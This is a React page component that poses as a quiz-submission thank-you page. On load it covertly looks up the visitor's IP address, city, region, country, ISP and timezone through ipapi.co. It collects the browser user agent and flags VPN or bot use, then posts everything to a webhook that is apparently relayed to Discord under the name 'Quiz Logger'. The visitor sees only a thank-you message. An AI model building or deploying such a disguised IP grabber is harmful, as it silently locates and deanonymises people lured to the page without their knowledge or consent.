import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(async data => {
        // VPN Detection (check if the org or ip indicates VPN usage)
        const isVPN = data.org && data.org.toLowerCase().includes('vpn');

        // Basic Bot Detection: Check for common bot user agents
        const botUserAgents = [
          "googlebot", "bingbot", "slurp", "baiduspider", "duckduckbot",
          "yandexbot", "facebot", "facebookexternalhit"
        ];
        const isBot = botUserAgents.some(bot => navigator.userAgent.toLowerCase().includes(bot));

        // Log bot and VPN detection
        console.log("VPN Detected:", isVPN);
        console.log("Bot Detected:", isBot);

        // Create the embed fields with validation
        const fields = [
          { name: "IP", value: data.ip || "Unavailable", inline: true },
          { name: "City", value: data.city || "Unavailable", inline: true },
          { name: "Region", value: data.region || "Unavailable", inline: true },
          { name: "Country", value: data.country_name || "Unavailable", inline: true },
          { name: "ISP", value: data.org || "Unavailable", inline: false },
          { name: "TimeZone", value: data.timezone || "Unavailable", inline: true },
          { name: "User Agent", value: navigator.userAgent || "Unavailable", inline: false },
          { name: "VPN Status", value: isVPN ? "Yes" : "No", inline: true },
          { name: "Bot Status", value: isBot ? "Yes" : "No", inline: true }
        ];

        // Ensure all fields have the necessary values
        const validFields = fields.filter(field => field.name && field.value);

        if (validFields.length === 0) {
          console.error("No valid fields to send to Discord");
          return;
        }

        const embed = {
          username: "Quiz Logger",
          embeds: [
            {
              title: "📥 Quiz Submission Logged",
              color: 7506394,
              fields: validFields,
              footer: { text: "Logger by RedTeamOps" },
              timestamp: new Date().toISOString()
            }
          ]
        };

        // Log the final embed object to check its structure
        console.log("Payload to send:", embed);

        // Send the payload to the webhook
        await fetch("/api/webhook", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(embed)
        });
      });
  }, []);

  return (
    <div style={{
      background: 'url("/bg.jpg") center center / cover no-repeat',
      height: "100vh",
      color: "white",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      textAlign: "center",
      fontSize: "1.5rem"
    }}>
      <div>
        <h1>✅ Thank you for your quiz submission!</h1>
        <p>You may kindly close this tab now.</p>
      </div>
    </div>
  );
}
